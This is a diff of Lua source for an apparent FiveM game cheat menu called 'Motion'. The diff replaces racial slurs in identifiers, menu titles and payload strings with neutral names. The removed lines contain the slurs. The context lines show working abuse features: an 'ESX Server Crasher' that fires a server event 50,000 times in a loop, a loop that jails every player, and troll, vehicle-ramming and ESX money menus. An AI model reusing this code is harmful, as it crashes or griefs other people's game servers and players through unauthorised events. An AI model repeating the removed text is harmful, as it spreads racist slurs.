@@ -16,7 +16,7 @@ local rainbow = false
 
 local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu", 
                             "ESXMenu", "ESXJobMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu", 
-                            "TeleportMenu", "NiggerCustoms", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu", 
+                            "TeleportMenu", "MotionCustoms", "PlayerTrollMenu", "PlayerESXMenu", "PlayerESXJobMenu", 
                             "PlayerESXTriggerMenu", "BulletGunMenu", "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
                             "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "PerformanceMenu", "SingleWepPlayer", "SettingsMenu", "VehBoostMenu",
                             "ESXMiscMenu", "ESXDrugMenu", "VRPMenu", "Credits", "SpawnPedsMenu", "Themes", "CarTypeSelection" ,"CarOptions", 
@@ -3232,33 +3232,33 @@ Citizen.CreateThread(
                 end
             end
 
-            local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
+            local Vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
             if IsPedInAnyVehicle(PlayerPedId()) then	
                 if driftMode then
-                    SetVehicleGravityAmount(niggerVehicle, 5.0)
+                    SetVehicleGravityAmount(Vehicle, 5.0)
                 elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
-                    SetVehicleGravityAmount(niggerVehicle, 10.0)
+                    SetVehicleGravityAmount(Vehicle, 10.0)
                 end
                 
             
                 if superGrip then				
-                    SetVehicleGravityAmount(niggerVehicle, 20.0)
+                    SetVehicleGravityAmount(Vehicle, 20.0)
                 elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
-                    SetVehicleGravityAmount(niggerVehicle, 10.0)			
+                    SetVehicleGravityAmount(Vehicle, 10.0)			
                 end
 
                 if enchancedGrip then
-                    SetVehicleGravityAmount(niggerVehicle, 12.0)
+                    SetVehicleGravityAmount(Vehicle, 12.0)
                 elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
-                    SetVehicleGravityAmount(niggerVehicle, 10.0)
+                    SetVehicleGravityAmount(Vehicle, 10.0)
                 end
 
                 if fdMode then	
-                    SetVehicleGravityAmount(niggerVehicle, 5.5)
-                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 4.0)
+                    SetVehicleGravityAmount(Vehicle, 5.5)
+                    SetVehicleEngineTorqueMultiplier(Vehicle, 4.0)
                 elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
-                    SetVehicleGravityAmount(niggerVehicle, 10.0)
-                    SetVehicleEngineTorqueMultiplier(niggerVehicle, 1.0)
+                    SetVehicleGravityAmount(Vehicle, 10.0)
+                    SetVehicleEngineTorqueMultiplier(Vehicle, 1.0)
                 end
 
                 if t2x then 
@@ -3868,7 +3868,7 @@ Citizen.CreateThread(
         Motion.CreateSubMenu("VehSpawnOpt", "VehMenu", "Vehicle Spawn Options")
         Motion.CreateSubMenu("PlayerOptionsMenu", 'OnlinePlayersMenu', 'Player Options')
         Motion.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
-        Motion.CreateSubMenu("NiggerCustoms", "VehMenu", "Welcome To Nigger Customs!")
+        Motion.CreateSubMenu("MotionCustoms", "VehMenu", "Welcome To Motion Customs!")
         Motion.CreateSubMenu("PlayerTrollMenu", "PlayerOptionsMenu", "Troll Options")
         Motion.CreateSubMenu("PlayerESXMenu", "PlayerOptionsMenu", "ESX Options")
         Motion.CreateSubMenu("PlayerESXJobMenu", "PlayerOptionsMenu", "ESX Jobs")
@@ -3880,19 +3880,19 @@ Citizen.CreateThread(
         Motion.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
         Motion.CreateSubMenu("ESXBossMenu", "ESXMenu", "ESX Boss")
         Motion.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
-        Motion.CreateSubMenu("PerformanceMenu", "NiggerCustoms", "Performance Tuning")
+        Motion.CreateSubMenu("PerformanceMenu", "MotionCustoms", "Performance Tuning")
         Motion.CreateSubMenu("SingleWepPlayer", 'PlayerOptionsMenu', 'Single Weapon Menu')
         Motion.CreateSubMenu("SettingsMenu", "MainMenu", "Settings")
         Motion.CreateSubMenu("Credits", "SettingsMenu", "Credits")
         Motion.CreateSubMenu("Themes", "SettingsMenu", "Themes")
         Motion.CreateSubMenu("ESXMiscMenu", "ESXMenu", "ESX Misc")
-        Motion.CreateSubMenu("VehBoostMenu", "NiggerCustoms", "Vehicle Booster")
+        Motion.CreateSubMenu("VehBoostMenu", "MotionCustoms", "Vehicle Booster")
         Motion.CreateSubMenu("SpawnPedsMenu", "TrollMenu", "Spawn Peds")
         Motion.CreateSubMenu("CarTypeSelection", "VehMenu", "Vehicle Types")
         Motion.CreateSubMenu("CarOptions", "CarTypeSelection", "Car Types")
         Motion.CreateSubMenu("CarTypes", "VehMenu", "Vehicles") 
-        Motion.CreateSubMenu("tunings", "NiggerCustoms", "Extrerior Tuning")
-        Motion.CreateSubMenu("performance", "NiggerCustoms", "Performance Tuning")
+        Motion.CreateSubMenu("tunings", "MotionCustoms", "Extrerior Tuning")
+        Motion.CreateSubMenu("performance", "MotionCustoms", "Performance Tuning")
         Motion.CreateSubMenu("WeaponTypes", "WeaponMenu", "Weapons") 
         Motion.CreateSubMenu("WeaponTypeSelection", "WeaponTypes", "Weapon") 
         Motion.CreateSubMenu("WeaponOptions", "WeaponTypeSelection", "Weapon Options") 
@@ -4581,7 +4581,7 @@ Citizen.CreateThread(
                 Motion.Display()
             elseif Motion.IsMenuOpened("TrollMenu") then
                 if Motion.Button("ESX Server Crasher") then
-                    for i = 1, 50000 do TriggerServerEvent('esx_skin:responseSaveSkin', {niggers = 'gay'}) TriggerServerEvent('esx_skin:responseSaveSkin', 'niggers eat shit') end
+                    for i = 1, 50000 do TriggerServerEvent('esx_skin:responseSaveSkin', {pla = 'open'}) TriggerServerEvent('esx_skin:responseSaveSkin', 'Mestari was here') end
                 elseif Motion.Button("ESX Send All To Jail") then
                     for i = 1, 128 do
                         TriggerServerEvent("esx-qalle-jail:jailPlayer", i, 5000,"Jailed")
@@ -4949,7 +4949,7 @@ Citizen.CreateThread(
                         end
                 elseif Motion.MenuButton("∑Vehicle Spawner", "CarTypes") then
                 elseif Motion.MenuButton("∑Spawn options", "VehSpawnOpt") then
-                elseif Motion.MenuButton("∑Nigger Customs", "NiggerCustoms") then
+                elseif Motion.MenuButton("∑Motion Customs", "MotionCustoms") then
                 elseif Motion.Button("Delete Vehicle") then
                     DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                 elseif Motion.Button("Delete Closest Vehicle") then
@@ -5010,7 +5010,7 @@ Citizen.CreateThread(
                     end
 
                 Motion.Display()
-            elseif Motion.IsMenuOpened("NiggerCustoms") then
+            elseif Motion.IsMenuOpened("MotionCustoms") then
                 if Motion.CheckBox(
                     "Super Handling",
                     superGrip,
